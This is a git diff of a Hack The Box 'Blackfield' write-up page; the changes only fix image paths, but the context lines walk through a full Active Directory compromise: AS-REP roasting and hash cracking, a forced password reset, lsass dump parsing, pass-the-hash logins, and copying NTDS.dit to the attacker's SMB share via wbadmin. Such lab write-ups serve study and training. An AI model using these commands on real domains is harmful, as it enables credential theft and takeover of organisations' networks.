@@ -6,7 +6,7 @@ description: https://app.hackthebox.com/machines/255
 
 We start by doing a quick nmap:&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (893).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (893).png" alt=""><figcaption></figcaption></figure>
 
 We can see DNS on port 53, Kerberos on port 88 and secured LDAP on port 3268 and a domain BLACKFIELD.local
 
@@ -20,7 +20,7 @@ It's good to note we do not have a webserver&#x20;
 
 then, always good to try rpcclient on an Active Directory:
 
-<figure><img src="../../../.gitbook/assets/image (894).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (894).png" alt=""><figcaption></figcaption></figure>
 
 ```
 rpcclient 10.129.229.17
@@ -48,7 +48,7 @@ smbclient -L 10.129.229.14 -U ''
 
 So we get few shares but we got the same output from the 2 commands:
 
-<figure><img src="../../../.gitbook/assets/image (895).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (895).png" alt=""><figcaption></figcaption></figure>
 
 We continue our smb enumeration with CrackMapExec since smbclient is not very verbose on the read/write side of things:
 
@@ -62,7 +62,7 @@ cme smb 10.129.229.17 --shares -u 'testUser'
 cme smb 10.129.229.17 --shares -u 'testUser' -p ''
 ```
 
-<figure><img src="../../../.gitbook/assets/image (896).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (896).png" alt=""><figcaption></figcaption></figure>
 
 So know we know we can read the IPC and "profiles shares:
 
@@ -76,11 +76,11 @@ another way of seeing this is using smbmap:
 smbmap -H 10.129.229.17 -u null
 ```
 
-<figure><img src="../../../.gitbook/assets/image (898).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (898).png" alt=""><figcaption></figcaption></figure>
 
 We put it in single quotes because the $ is a shady character that could cause some errors
 
-<figure><img src="../../../.gitbook/assets/image (897).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (897).png" alt=""><figcaption></figcaption></figure>
 
 So we got a big list of users, the good thing to do now is to mount it but i did not manage to do so. So I manually created a list of all possible usernames
 
@@ -92,7 +92,7 @@ kerbrute userenum --dc 10.129.229.17 -d blackfield  users.lst -o kerburute.usere
 
 and we have a few valid usernames:
 
-<figure><img src="../../../.gitbook/assets/image (900).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (900).png" alt=""><figcaption></figcaption></figure>
 
 So the username audit2020@blackfield is a good hint, since there was a share that was called "Forensic /audit share"
 
@@ -102,7 +102,7 @@ So we remember we outputted the result in a kerbrute.userenum file, and now we n
 grep VALID kerburute.userenum.out | awk '{print $7}'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (901).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (901).png" alt=""><figcaption></figcaption></figure>
 
 1. `grep VALID kerbrute.userenum.out`: This part of the command uses `grep` to search for lines in the file `kerbrute.userenum.out` that contain the word "VALID". `grep` is a command-line utility for searching plain-text data sets for lines that match a regular expression.
 2. `|`: This symbol is called a pipe. It's used to redirect the output of one command (in this case, `grep`) as input to another command (in this case, `awk`).
@@ -114,7 +114,7 @@ We can even go further and get rid of the @blackfield tag:
 grep VALID kerburute.userenum.out | awk '{print $7}' | awk -F\@ '{print $1}' >users.lst
 ```
 
-<figure><img src="../../../.gitbook/assets/image (902).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (902).png" alt=""><figcaption></figcaption></figure>
 
 now with those valid users we'd want to use impacket's kerberos pre-auth check ->
 
@@ -122,7 +122,7 @@ now with those valid users we'd want to use impacket's kerberos pre-auth check -
 GetNPUsers.py -dc-ip 10.129.229.17 -no-pass -usersfile users.lst blackfield/
 ```
 
-<figure><img src="../../../.gitbook/assets/image (903).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (903).png" alt=""><figcaption></figcaption></figure>
 
 So now we just go on hashcat and crack it (krbtgt = mode 18200):
 
@@ -130,7 +130,7 @@ So now we just go on hashcat and crack it (krbtgt = mode 18200):
 hashcat -m 18200 blackfield.txt /usr/share/wordlists/rockyou.txt
 ```
 
-<figure><img src="../../../.gitbook/assets/image (904).png" alt=""><figcaption><p>#00^BlackKnight</p></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (904).png" alt=""><figcaption><p>#00^BlackKnight</p></figcaption></figure>
 
 So now we can use those creds to try and enumerate our SMB server some more
 
@@ -151,11 +151,11 @@ sudo mount -t cifs -o 'username=support,password=#00^BlackKnight' //10.129.229.1
 
 we can access all user files:
 
-<figure><img src="../../../.gitbook/assets/image (905).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (905).png" alt=""><figcaption></figcaption></figure>
 
 So i try to access the support file, but there is nothing inside, i try looking around but nothing there:
 
-<figure><img src="../../../.gitbook/assets/image (906).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (906).png" alt=""><figcaption></figcaption></figure>
 
 So now we unmount the folder and connect via rpcclient:
 
@@ -172,7 +172,7 @@ enumdomusers
 
 command to find some more users:
 
-<figure><img src="../../../.gitbook/assets/image (907).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (907).png" alt=""><figcaption></figcaption></figure>
 
 Now we put this in a file and use the following command to clean the output:
 
@@ -180,7 +180,7 @@ Now we put this in a file and use the following command to clean the output:
 cat rpcusers.lst | awk -F'\[' '{print $2}' | awk -F '\]' '{print $1}' > newRpcClient.lst
 ```
 
-<figure><img src="../../../.gitbook/assets/image (908).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (908).png" alt=""><figcaption></figcaption></figure>
 
 We reuse the GetNpUsers.py command:
 
@@ -194,7 +194,7 @@ we'll download the python version of bloodhound: [https://github.com/dirkjanm/Bl
 
 now we need to do some .conf manipulation  and remove all related to this box in our /etc/hosts file->
 
-<figure><img src="../../../.gitbook/assets/image (909).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (909).png" alt=""><figcaption></figcaption></figure>
 
 1. `nameserver 10.129.229.17`: This entry specifies the IP address of the DNS server that the system should use for domain name resolution. In this case, `10.129.229.17` is likely the IP address of the domain controller or another DNS server within the domain infrastructure. Configuring the correct DNS server ensures that the system can properly resolve domain names to their corresponding IP addresses.
 2. `search blackfield`: This entry specifies the default domain search suffix to be appended to unqualified domain names. When you attempt to resolve a hostname without specifying its fully qualified domain name (FQDN), the system will append the search suffix to the hostname before attempting resolution. This is particularly useful in a domain environment where most hostnames belong to the same domain. In this case, `blackfield` is the domain name, so specifying it as the search suffix allows you to refer to hosts within the `blackfield` domain without typing their FQDNs every time.
@@ -207,11 +207,11 @@ And then we are able to trigger the following command:
 python3 bloodhound.py -u support -p '#00^BlackKnight' -ns 10.129.229.17 -d blackfield.local -c all
 ```
 
-<figure><img src="../../../.gitbook/assets/image (910).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (910).png" alt=""><figcaption></figcaption></figure>
 
 So now we got a whole lotta json files:
 
-<figure><img src="../../../.gitbook/assets/image (911).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (911).png" alt=""><figcaption></figcaption></figure>
 
 we are going to launch a neo4j console:
 
@@ -219,25 +219,25 @@ we are going to launch a neo4j console:
 neo4j console
 ```
 
-<figure><img src="../../../.gitbook/assets/image (912).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (912).png" alt=""><figcaption></figcaption></figure>
 
 And next we need to open bloodhound, this was the following path i needed to follow in my pwnbox to get to it:
 
-<figure><img src="../../../.gitbook/assets/image (913).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (913).png" alt=""><figcaption></figcaption></figure>
 
 managed to connect with the creds neo4j/neo4j
 
 So happy to be at this point of the box, now we upload all our json files on the bloodhound instance, panicked for a bit because nothing really seemed to pop on the screen but if we type in "support" in the search bar there will be a "SUPPORT@BLACKFIELD.LOCAL" user that will pop that we will mark as **owned**
 
-<figure><img src="../../../.gitbook/assets/image (914).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (914).png" alt=""><figcaption></figcaption></figure>
 
 We then need to declare the user as "starting node" and then access the pre built queries:
 
-<figure><img src="../../../.gitbook/assets/image (915).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (915).png" alt=""><figcaption></figcaption></figure>
 
 i then check out the node info and find interesting details in the "outbound object control" that counts 1 parameterin the "first degree object control" and When we click the “1”, I can see that support has “ForceChangePassword” on AUDIT2020:
 
-<figure><img src="../../../.gitbook/assets/image (916).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (916).png" alt=""><figcaption></figcaption></figure>
 
 * **Outbound Object Control**: This property refers to the permissions and access rights that the node (e.g., user account) has over other objects in the AD environment. In this context, "outbound" means the permissions granted by the node to other objects.
 * **First Degree Object Control**: This property specifically indicates the level of control or permissions granted by the node directly to other objects. "First degree" implies a direct relationship between the node and the objects it controls.
@@ -245,15 +245,15 @@ i then check out the node info and find interesting details in the "outbound obj
 
 We could abuse this in powershell if we were on a Windows machine with a right click on "forcechangepassword" -> :
 
-<figure><img src="../../../.gitbook/assets/image (917).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (917).png" alt=""><figcaption></figcaption></figure>
 
 So we are going to go and use rpcclient to change the password of Audit2020, and we need to be aware of password complexity policies:
 
-<figure><img src="../../../.gitbook/assets/image (918).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (918).png" alt=""><figcaption></figcaption></figure>
 
 And now if we look at the shares we can access the forensic shares:
 
-<figure><img src="../../../.gitbook/assets/image (919).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (919).png" alt=""><figcaption></figcaption></figure>
 
 So now we go and do again our mount manipulation ->
 
@@ -261,11 +261,11 @@ So now we go and do again our mount manipulation ->
 sudo mount -t cifs -o 'username=Audit2020,password=PleaseSub!' //10.129.229.17/forensic /mnt
 ```
 
-<figure><img src="../../../.gitbook/assets/image (920).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (920).png" alt=""><figcaption></figcaption></figure>
 
 The file that stand out is the lsass.zip file because lsass is where mimikatz pulls plaintext passwords from, so we copy, unzip it and look on internet for the perfect tool:
 
-<figure><img src="../../../.gitbook/assets/image (921).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (921).png" alt=""><figcaption></figcaption></figure>
 
 while looking up we cross upon this tool:[https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)
 
@@ -277,7 +277,7 @@ pip3 install pypypkatz
 
 and after looking at the manuel
 
-<figure><img src="../../../.gitbook/assets/image (923).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (923).png" alt=""><figcaption></figcaption></figure>
 
 run the following:
 
@@ -285,7 +285,7 @@ run the following:
 pypykatz lsa minidump lsass.DMP > lsass.out
 ```
 
-<figure><img src="../../../.gitbook/assets/image (922).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (922).png" alt=""><figcaption></figcaption></figure>
 
 Now we got plenty of args so we'll grep out what we think are interesting:
 
@@ -293,7 +293,7 @@ Now we got plenty of args so we'll grep out what we think are interesting:
 grep NT lsass.out -B3 | grep -i username
 ```
 
-<figure><img src="../../../.gitbook/assets/image (924).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (924).png" alt=""><figcaption></figcaption></figure>
 
 ```
 svc_backup -> 9658d1d1dcd9250115e2205d9f48400d
@@ -308,7 +308,7 @@ cme smb 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
 
 and we manage to have access to svc\_backup:
 
-<figure><img src="../../../.gitbook/assets/image (925).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (925).png" alt=""><figcaption></figcaption></figure>
 
 So now a good thing to try would be to use evil-winrm, let's test out some fun stuff:
 
@@ -316,9 +316,9 @@ So now a good thing to try would be to use evil-winrm, let's test out some fun s
 evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
 ```
 
-<figure><img src="../../../.gitbook/assets/image (926).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (926).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>
 
 With a quick&#x20;
 
@@ -328,7 +328,7 @@ whoami /priv
 
 I quickly see the high privileges of this user:
 
-<figure><img src="../../../.gitbook/assets/image (928).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (928).png" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960" %}
 
@@ -350,11 +350,11 @@ robocopy /b C:\Users\Administrator\Desktop\ C:\
 
 We are ableto see that we have access denied on the root.txt file, and we retrieve some interesting stuff in the :C\ repo:
 
-<figure><img src="../../../.gitbook/assets/image (938).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (938).png" alt=""><figcaption></figcaption></figure>
 
 We later on discover a notes.txt file that explains why we can't access it. the file was encrypted:
 
-<figure><img src="../../../.gitbook/assets/image (939).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (939).png" alt=""><figcaption></figcaption></figure>
 
 So we first need to gain admin privileges before we want to read anything, we'll start by configuring a samaba server with auth in order to abuse SeBackup and SeRestore privileges to dum AD DB in an attempt to use the admin hash to performe PtH ->
 
@@ -416,11 +416,11 @@ Now our goal will be to backup the NTDS folder using Wbadmin:
 echo "Y" | wbadmin start backup -backuptarget:\\10.10.14.141\smb -include:c:\windows\ntds
 ```
 
-<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>
 
 We can see that it backed up successfully:
 
-<figure><img src="../../../.gitbook/assets/image (942).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (942).png" alt=""><figcaption></figcaption></figure>
 
 Now we'll need to recover the version of the backup:
 
@@ -430,13 +430,13 @@ wbadmin get versions
 
 Be careful to take the good backup version:
 
-<figure><img src="../../../.gitbook/assets/image (943).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (943).png" alt=""><figcaption></figcaption></figure>
 
 ```
 echo "Y" | wbadmin start recovery -version:05/01/2024-16:36 -itemtype:file -items:C:\Windows\NTDS\ntds.dit -recoverytarget:C:\ -notrestoreacl
 ```
 
-<figure><img src="../../../.gitbook/assets/image (944).png" alt=""><figcaption><p>Pretty happy of this after hours of troubleshooting <span data-gb-custom-inline data-tag="emoji" data-code="1f389">🎉</span></p></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (944).png" alt=""><figcaption><p>Pretty happy of this after hours of troubleshooting <span data-gb-custom-inline data-tag="emoji" data-code="1f389">🎉</span></p></figcaption></figure>
 
 We then need to export the system hive too:
 
@@ -448,11 +448,11 @@ reg save HKLM\SYSTEM C:\system.hive
 
 We then donwload everything to our local machine:
 
-<figure><img src="../../../.gitbook/assets/image (945).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (945).png" alt=""><figcaption></figcaption></figure>
 
 Was a bit afraid because i couldn't find the files but they were just in the Desktop of elfelixio:
 
-<figure><img src="../../../.gitbook/assets/image (946).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (946).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -472,7 +472,7 @@ Was a bit afraid because i couldn't find the files but they were just in the Des
 
 So we do the following commands but we fail:
 
-<figure><img src="../../../.gitbook/assets/image (930).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (930).png" alt=""><figcaption></figcaption></figure>
 
 ```
 sudo smbserver.py -smb2support -user elfelixio -password TestPass OurShare $(pwd)
@@ -500,7 +500,7 @@ net use x: \\10.10.14.141\OurShare /user:elfelixio TestPass
 
 Using some ressources we see that this error is related to NTFS folder so we create one:
 
-<figure><img src="../../../.gitbook/assets/image (931).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (931).png" alt=""><figcaption></figcaption></figure>
 
 ```
 dd if=/dev/zero of=ntfs.disk bs=1024M count=2 
@@ -514,21 +514,21 @@ and to complete our ntfs disk:
 sudo mkfs.ntfs /dev/loop1
 ```
 
-<figure><img src="../../../.gitbook/assets/image (932).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (932).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (933).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (933).png" alt=""><figcaption></figcaption></figure>
 
 we now cd into our mounted smb file and re run our failed commands:
 
 We get some better results but fail; apparently impacket does not handle well NTFS:
 
-<figure><img src="../../../.gitbook/assets/image (934).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (934).png" alt=""><figcaption></figcaption></figure>
 
 So we are going to use the legit smb pass to do this, so i nano intp /etc/samba/smb.confand then duplicate and modify the print part:
 
-<figure><img src="../../../.gitbook/assets/image (935).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (935).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (936).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (936).png" alt=""><figcaption></figcaption></figure>
 
 now we need to restart smb:
 
@@ -536,7 +536,7 @@ now we need to restart smb:
 systemctl restart smbd
 ```
 
-<figure><img src="../../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>
 
 Now we re run all the goofy commands we did earlier, and test out if it works but creating a folder in the winrm sesh and accessing it via our local terminal with a&#x20;
 
